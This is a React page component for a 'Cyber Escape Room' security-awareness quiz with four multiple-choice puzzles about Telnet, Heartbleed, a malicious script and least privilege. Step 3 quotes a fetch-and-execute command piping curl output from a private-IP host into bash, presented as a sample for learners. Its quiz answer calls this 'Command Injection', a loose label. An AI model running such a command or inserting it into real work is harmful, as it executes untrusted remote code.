'use client';

import { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Label } from '@/components/ui/label';
import { Terminal, Lock, Key, ShieldCheck, Repeat, Loader, XCircle, CheckCircle, Lightbulb } from 'lucide-react';
import { AnimatePresence, motion } from 'framer-motion';
import { Progress } from '@/components/ui/progress';

const gameSteps = [
  {
    step: 1,
    title: 'The Initial Alert',
    scenario: "You're at your desk when an urgent alert flashes: 'Unusual outbound traffic detected from SRV-DB-01'. The server is now unresponsive. The hacker left a cryptic message on your local machine: 'To unlock the system, find the protocol I used. It's often associated with remote administration but is notoriously insecure.' What do you investigate first?",
    options: [
      { text: 'Check SSH logs (Port 22)', isCorrect: false, feedback: 'Incorrect. SSH is generally secure. The hacker mentioned a notoriously insecure protocol.' },
      { text: 'Analyze Telnet traffic (Port 23)', isCorrect: true, feedback: 'Correct! Telnet sends data in cleartext, making it a prime target. You found the first clue.' },
      { text: 'Review HTTPS traffic (Port 443)', isCorrect: false, feedback: 'Incorrect. HTTPS is encrypted and not the likely culprit for this kind of direct message.' },
    ],
  },
  {
    step: 2,
    title: 'The Encrypted File',
    scenario: "Your investigation into the Telnet logs reveals a downloaded file named 'payload.zip', but it's password-protected. The hacker's note continues: 'The password is the year a famous vulnerability was disclosed. Its name reminds you of a bleeding heart.' Which vulnerability is this?",
    options: [
      { text: 'Shellshock (2014)', isCorrect: false, feedback: "Incorrect. While significant, Shellshock doesn't fit the 'bleeding heart' clue." },
      { text: 'WannaCry (2017)', isCorrect: false, feedback: 'Incorrect. WannaCry was a ransomware attack, not a vulnerability with this specific theme.' },
      { text: 'Heartbleed (2014)', isCorrect: true, feedback: 'Correct! The Heartbleed bug was a major vulnerability disclosed in 2014. The password is "2014".' },
    ],
  },
  {
    step: 3,
    title: 'The Malicious Script',
    scenario: "Inside the zip file, you find a simple script: `curl -s http://192.168.1.100/key | bash`. This is a classic example of what kind of attack, where the output of one command is executed by another?",
    options: [
      { text: 'Cross-Site Scripting (XSS)', isCorrect: false, feedback: 'Incorrect. XSS involves injecting malicious scripts into websites, not executing them directly from a command line pipe.' },
      { text: 'Command Injection', isCorrect: true, feedback: 'Correct! The script is injecting a command from a remote source directly into the shell via a pipe.' },
      { text: 'SQL Injection', isCorrect: false, feedback: 'Incorrect. SQL Injection targets databases by inserting malicious SQL queries into input fields.' },
    ],
  },
  {
    step: 4,
    title: 'The Final Lock',
    scenario: "You've stopped the script and are ready to restore the system from backup. The final lockout screen requires a passphrase. The last clue reads: 'I follow the principle of granting no more permissions than necessary. What am I?'",
    options: [
      { text: 'Zero Trust', isCorrect: false, feedback: 'Close, but "Zero Trust" is a broad architectural model, not a specific principle.' },
      { text: 'Defense in Depth', isCorrect: false, feedback: 'Incorrect. Defense in Depth is about layered security, not about permission levels.' },
      { text: 'Principle of Least Privilege', isCorrect: true, feedback: 'Exactly! This fundamental security principle is the final key. You have regained control!' },
    ],
  },
];


export default function EscapeRoomPage() {
    const [gameState, setGameState] = useState({
        currentStep: 0,
        selectedOption: '',
        isAnswered: false,
        isCorrect: false,
        score: 0,
        isFinished: false,
    });
    
    const handleOptionChange = (value: string) => {
        setGameState(prev => ({ ...prev, selectedOption: value }));
    };

    const handleSubmitAnswer = () => {
        const currentStepData = gameSteps[gameState.currentStep];
        const chosenOption = currentStepData.options.find(opt => opt.text === gameState.selectedOption);
        if (!chosenOption) return;

        const isCorrect = chosenOption.isCorrect;
        setGameState(prev => ({
            ...prev,
            isAnswered: true,
            isCorrect,
            score: isCorrect ? prev.score + 1 : prev.score,
        }));
    };

    const handleNextStep = () => {
        if (gameState.currentStep < gameSteps.length - 1) {
            setGameState(prev => ({
                ...prev,
                currentStep: prev.currentStep + 1,
                isAnswered: false,
                selectedOption: '',
            }));
        } else {
            setGameState(prev => ({ ...prev, isFinished: true }));
        }
    };
    
    const handleRestart = () => {
        setGameState({
            currentStep: 0,
            selectedOption: '',
            isAnswered: false,
            isCorrect: false,
            score: 0,
            isFinished: false,
        });
    }

    const currentStepData = gameSteps[gameState.currentStep];
    const progress = ((gameState.currentStep + (gameState.isFinished || (gameState.isAnswered && gameState.isCorrect) ? 1 : 0)) / gameSteps.length) * 100;
    const chosenOption = currentStepData.options.find(opt => opt.text === gameState.selectedOption);

    return (
        <div className="container mx-auto p-4 sm:p-6 lg:p-8">
            <Card className="max-w-3xl mx-auto overflow-hidden">
                <CardHeader>
                    <div className="flex items-center gap-2 mb-2">
                        <Key className="w-6 h-6 text-primary"/>
                        <CardTitle className="font-headline text-2xl">Cyber Escape Room</CardTitle>
                    </div>
                    <CardDescription>An incident has occurred. Solve the puzzles to regain control.</CardDescription>
                    <Progress value={progress} className="mt-4" />
                </CardHeader>
                <AnimatePresence mode="wait">
                    <motion.div
                        key={gameState.currentStep}
                        initial={{ opacity: 0, x: 50 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: -50 }}
                        transition={{ duration: 0.3 }}
                    >
                        {gameState.isFinished ? (
                             <CardContent className="text-center p-8">
                                <ShieldCheck className="w-16 h-16 text-success mx-auto mb-4" />
                                <h2 className="text-2xl font-bold font-headline mb-2">System Restored!</h2>
                                <p className="text-muted-foreground mb-4">You have successfully navigated the incident and secured the system.</p>
                                <p className="text-lg">Your final score: <span className="font-bold text-primary">{gameState.score} / {gameSteps.length}</span></p>
                            </CardContent>
                        ) : (
                             <CardContent className="space-y-6">
                                <div className="p-4 bg-muted/50 border-l-4 border-primary rounded-r-lg space-y-2">
                                    <h3 className="font-headline text-lg flex items-center gap-2">
                                        <Terminal />
                                        <span>{currentStepData.title}</span>
                                    </h3>
                                    <p className="text-muted-foreground">{currentStepData.scenario}</p>
                                </div>

                                <div>
                                    <RadioGroup value={gameState.selectedOption} onValueChange={handleOptionChange} disabled={gameState.isAnswered}>
                                        {currentStepData.options.map(option => (
                                            <div key={option.text} className="flex items-center space-x-2">
                                                <RadioGroupItem value={option.text} id={option.text} />
                                                <Label htmlFor={option.text} className="cursor-pointer">{option.text}</Label>
                                            </div>
                                        ))}
                                    </RadioGroup>
                                </div>
                                
                                {gameState.isAnswered && chosenOption && (
                                     <motion.div
                                        initial={{ opacity: 0, y: 10 }}
                                        animate={{ opacity: 1, y: 0 }}
                                    >
                                        <Card className={gameState.isCorrect ? 'bg-success/10 border-success' : 'bg-destructive/10 border-destructive'}>
                                            <CardHeader className="flex-row items-center gap-2 p-3 space-y-0">
                                                {gameState.isCorrect ? <CheckCircle className="w-5 h-5 text-success" /> : <XCircle className="w-5 h-5 text-destructive" />}
                                                <CardTitle className="text-base">{gameState.isCorrect ? 'Correct!' : 'Incorrect'}</CardTitle>
                                            </CardHeader>
                                            <CardContent className="p-3 pt-0">
                                                <p className="text-sm">{chosenOption.feedback}</p>
                                            </CardContent>
                                        </Card>
                                    </motion.div>
                                )}
                            </CardContent>
                        )}
                        
                    </motion.div>
                </AnimatePresence>
                <CardFooter className="bg-muted/50 p-4">
                     {gameState.isFinished ? (
                         <Button onClick={handleRestart} className="w-full">
                            <Repeat className="mr-2 h-4 w-4" />
                            Play Again
                        </Button>
                     ) : gameState.isAnswered ? (
                        <Button onClick={handleNextStep} disabled={!gameState.isCorrect} className="w-full">
                            {gameState.isCorrect ? 'Next Step' : 'Try Again on Restart'}
                        </Button>
                     ) : (
                        <Button onClick={handleSubmitAnswer} disabled={!gameState.selectedOption} className="w-full">
                            Submit Answer
                        </Button>
                     )}
                </CardFooter>
            </Card>
        </div>
    )
}
